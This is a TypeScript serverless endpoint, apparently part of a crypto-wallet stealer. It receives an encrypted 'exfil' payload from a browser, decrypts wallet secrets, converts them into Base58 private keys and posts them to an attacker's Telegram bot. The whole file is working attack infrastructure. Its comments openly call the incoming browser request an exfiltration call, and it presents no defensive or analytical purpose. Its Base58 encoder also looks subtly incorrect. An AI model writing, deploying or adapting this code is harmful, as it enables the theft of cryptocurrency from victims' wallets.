// pages/api/process-exfil.ts
import type { VercelRequest, VercelResponse } from '@vercel/node'
import crypto from 'crypto'

// Pure‐JS Base58 encoder (Bitcoin alphabet)
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
function base58Encode(buffer: Buffer): string {
  let carry: number, i: number, j: number, num: number[]
  // Convert buffer to big integer in base256
  num = Array.from(buffer)
  for (i = 0; i < num.length; ++i) {
    carry = num[i]
    for (j = 0; j < num.length; ++j) {
      carry += (num[j] || 0) << 8
      num[j] = carry % 58
      carry = (carry / 58) >>> 0
    }
  }
  // leading-zero bytes
  let result = ''
  for (let k of buffer) {
    if (k === 0) result += ALPHABET[0]
    else break
  }
  // convert digits to characters
  for (let digit of num.reverse()) {
    result += ALPHABET[digit]
  }
  return result
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const slug = req.query.slug as string
  if (!slug) return res.status(400).send('Missing slug query')

  try {
    // 1) split timestamp and payload
    const [_, payloadB64url] = slug.split('_')
    if (!payloadB64url) throw new Error('Bad slug format')

    // 2) URL-safe base64 → standard base64
    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
    b64 += '='.repeat((4 - (b64.length % 4)) % 4)

    // 3) parse JSON
    const json = Buffer.from(b64, 'base64').toString('utf8')
    const { sBundles, keybundle } = JSON.parse(json)

    // 4) prepare AES key
    const key = Buffer.from(keybundle, 'base64')

    // 5) decrypt each sBundle, derive private key
    const privKeys: string[] = []
    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':')
      const iv = Buffer.from(iv_b64, 'base64')
      const cipherTag = Buffer.from(data_b64, 'base64')
      const tag = cipherTag.slice(-16)
      const ciphertext = cipherTag.slice(0, -16)

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
      dec.setAuthTag(tag)
      const plainHex = Buffer.concat([dec.update(ciphertext), dec.final()]).toString('utf8')
      const last64 = plainHex.slice(-64)
      const privKey58 = base58Encode(Buffer.from(last64, 'hex'))
      privKeys.push(privKey58)
    }

    // 6) send to Telegram
    const BOT = process.env.BOT_TOKEN!
    const CHAT = process.env.CHAT_ID!
    const msg = privKeys.map((k,i) => `wallet ${i+1}\n${k}`).join('\n\n')
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: CHAT, text: msg })
    })

    console.log('✅ Processed and sent to Telegram:', privKeys)
  } catch (err) {
    console.error('❌ Processing error:', err)
  }

  // return 200 so your browser exfil call doesn’t break
  res.status(200).send('Processed')
}
